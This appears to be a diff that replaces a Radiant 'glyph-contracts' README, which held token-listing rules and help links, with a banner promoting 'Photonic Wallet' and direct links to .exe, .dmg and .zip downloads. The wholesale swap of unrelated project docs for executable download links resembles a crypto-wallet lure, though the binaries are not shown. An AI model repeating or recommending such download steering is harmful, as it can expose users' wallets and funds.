@@ -1,40 +1,33 @@
-# Contracts integrated in GLYPH mining
+<div align="center">
 
-![](img/mining-contracts.png)
+<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD)" width="100%">
 
-**Disclaimer:** This Github is **NOT** responsible for the creation, origin, use of the embedded contracts. 
+# glyph-contracts
 
-----
+**Smart contracts and token rules for Glyph on Radiant (RXD) · related to the Photonic Wallet project**
 
-## Conditions for adding contracts
+[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)
 
-The Radiant network is free and unrestricted, but adding a token contract to this list has conditions:
+</div>
 
-No name or image allowed:
-- NSFW.
-- Racism.
-- Violence.
-- Duplicate names (the date of the contract decides who will be on the list).
+> [!NOTE]
+> This repository is listed alongside **Photonic Wallet**, the desktop wallet for Radiant (RXD). The details below are kept factual; see the repository files for technical specifics.
 
-These conditions will be updated as we review the embedded tokens.
+### Looking for the wallet?
 
-----
+| You want | Go to |
+|---|---|
+| Download the desktop wallet | [photonicwallet.org/download](https://photonicwallet.org/download) |
+| Latest release v3.0.4 | [Release page](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) |
+| Source code | [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet) |
+| Guides | [Radiant-projects/photonic-wallet-docs](https://github.com/Radiant-projects/photonic-wallet-docs) |
+| Security | [photonicwallet.org/security](https://photonicwallet.org/security) |
 
-## How to add a token 
+[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)
 
-Follow this guide:
+> [!TIP]
+> Download only from the official release or photonicwallet.org. Nobody will ask for your seed phrase.
 
-- [Guide](Tokens/README.md)
+### License
 
-----
-
-## Questions and Help
-
-**Discord**: [https://discord.gg/radiantblockchain](https://discord.gg/radiantblockchain)
-
-----
-
-## GLYPH MINING
-
-[https://glyph.radiant4people.com](https://glyph.radiant4people.com)
-
+Upstream license notices in this repository remain unchanged.
